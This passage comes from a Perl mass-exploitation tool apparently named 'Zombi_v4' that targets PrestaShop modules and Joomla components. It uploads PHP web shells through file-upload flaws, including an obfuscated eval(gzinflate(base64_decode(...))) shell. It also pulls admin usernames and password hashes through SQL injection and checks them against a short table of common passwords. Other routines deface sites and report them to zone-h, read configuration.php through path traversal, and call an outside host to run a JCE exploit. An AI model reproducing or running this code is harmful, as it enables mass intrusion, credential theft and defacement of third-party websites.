my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/v4.php";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $attributewizardproOLDup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/v4.php";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"attributewizardpro_x";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $attributewizardpro_xup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold white'),"attributewizardpro_x";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["v4.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/v4.php.png";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"advancedslider";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $advancedsliderup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold white'),"advancedslider";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["v4.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/v4.php.png";
my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"cartabandonmentpro";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $cartabandonmentproup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["v4.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/v4.php.png";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"cartabandonmentproOld";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $cartabandonmentproOldup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["v4.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/v4.php.mp4";
my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/Dr HeX Shell/) {
print color('bold white'),"videostab";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $videostabup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold white'),"videostab";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["v4.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/v4.php";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/Dr HeX Shell/) {
print color('bold white'),"wg24themeadministration";
print color('bold white')," +++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $wg24themeadministrationup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold white'),"wg24themeadministration";
print color('bold white')," +++++++++++ ";
print color('bold red'),"False\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="v4.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/v4.php";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/Dr HeX Shell/) {
print color('bold white'),"fieldvmegamenu";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $fieldvmegamenuup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold white'),"fieldvmegamenu";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["v4.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/v4.php";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/Dr HeX Shell/) {
print color('bold white'),"wdoptionpanel";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $wdoptionpanelup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"wdoptionpanel";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="v4.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/v4.php";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $pk_flexmenuup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold white'),"pk_flexmenu";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="v4.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/v4.php";
my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/Dr HeX Shell/) {
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $pk_vertflexmenuup\n";

open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/Dr HeX Shell/) {
print color('bold white'),"nvn_export_orders";
print color('bold white')," +++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $nvn_export_ordersup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold white'),"nvn_export_orders";
print color('bold white')," +++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=v4.php";
my $shell ="v4.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/v4.php.png";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/Dr HeX Shell/) {
print color('bold white'),"megamenu";
print color('bold white')," ++++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $megamenuup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold white'),"megamenu";
print color('bold white')," ++++++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="v4.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/v4.php";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/Dr HeX Shell/) {
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="v4.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/v4.php";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/Dr HeX Shell/) {
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="v4.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/v4.php";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/Dr HeX Shell/) {

print color('bold white'),"masseditproduct";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $masseditproductup\n\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold white'),"masseditproduct";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False\n\n";
}
}


################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold white')," Username : $user\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold white'),"Cracking Hash : ";
print color('bold Yellow'),"Found!\n";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold white'),"Password : ";
print color('bold red'),"NOt FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
print color('bold white'),"Admin Panel : ";
print color('bold Yellow'),"Found!\n";
print color('bold white'),"URL : $pathone\n\n";
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOt FOUND\n\n";
}
}






#       _                           _       ______            
#      | |                         | |     |  ____|           
# | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __  
#  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \ 
# | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |
#  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/ 
#                                                      | |    
#
################ foxcontact #####################

################ Version #####################
sub versionn(){

my $url = "$site/language/en-GB/en-GB.xml";
my $checkomusersc = $ua->get("$url")->content;

if($checkomusersc =~/<version>(.*)</) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Joomla Version";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold white'),"";
print color('bold Yellow'),"$1";
print color('bold white'),"\n";

open (TEXT, '>>Zombi_v4/version.txt');
print TEXT "joom => $site => $1\n";
close (TEXT);
}
}

sub fox2(){

my @filesz = ('/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
print colored ("[ Scanning Foxcontact]",'white on_blue'),$url."\n";
my $checkfoxupx = $ua->get("$url")->content;
if ($checkfoxupx =~ /foxcontact/) {	
	my $regex='<a name="cid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
		my $regex='<a name="mid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
}
my @files = ('components/com_foxcontact/lib/file-uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../hex.php','index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id='.$1.'?cid='.$1.'&mid='.$1.'&qqfile=/../../hex.php','index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id='.$1.'&cid='.$1.'&mid='.$1.'&owner=module&id='.$1.'&qqfile=/../../hex.php','components/com_foxcontact/lib/uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../hex.php');
OUTER: foreach my $vul(@files){
chomp $vul;
 my $izo = $site . $vul; 
my $indexa='<h5>Uploder hex</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAv4mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $indexa
        );
$foxups="$site/components/com_foxcontact/hex.php";
}		
my $checkfoxup = $ua->get("$foxups")->content;
if ($checkfoxup =~ /hex/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold Yellow'),"[Link] => $foxups\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$foxups\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}
}
}
}

############### Jce Img   ####################

sub comjce(){

$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"JCE Image Upload ++++++++++++++++++ ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["v4hex.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "False\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/v4hex.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>Zombi_v4/v4index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold Yellow');
	print "[True Success]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "False\n";
    print color('reset');

}
    }

################ comweblink #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="v4hex.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/v4hex.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
$def = $weblinksup;
zoneh();
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ jce shell ###################

sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Jce Upload Shell] +++++++++++++++++++ ";


$drupalink = "http://misterhexbot.com/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold Yellow');
print "[True Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/images/stories/hex3xp.php\n";
    close(save);
    }
else{
    print color('bold red');
print  "False\n";
    print color('reset');


        }

}


############### ADS Manger ###################

sub comadsmanegr(){

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"[Com Ads Manger ] ++++++++++++++++++++ ";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["v4def.jpg"], name => "def.html"]);
if ($exploit->decoded_content =~ /def.html/) {
        open(save, '>>Zombi_v4/v4index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/def.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Dr HeX/) {
    print "[True Success]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "False\n\n";
    print color('reset');

;
}
}



####################################################################################################
####################################################################################################
######################################COM hdflvplayer##############################################
####################################################################################################
####################################################################################################
   sub hdflvplayer(){

# // here for download config but i have to add download cpanel information :p  //
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

